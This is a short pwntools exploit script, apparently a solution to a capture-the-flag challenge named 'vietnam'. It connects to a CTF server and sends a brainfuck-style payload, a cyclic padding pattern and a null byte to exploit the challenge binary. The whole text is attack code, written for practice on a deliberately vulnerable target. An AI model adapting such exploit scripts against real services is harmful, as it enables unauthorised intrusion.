from pwn import *

elf = ELF("./vietnam")
r = remote("chall.csivit.com", 30814)

payload = ",[,.]"  # loop, incrementing str until we send null
r.send(payload)
r.send(cyclic(1019))
r.send("HELLO\n")
r.send("\x00")
r.stream()
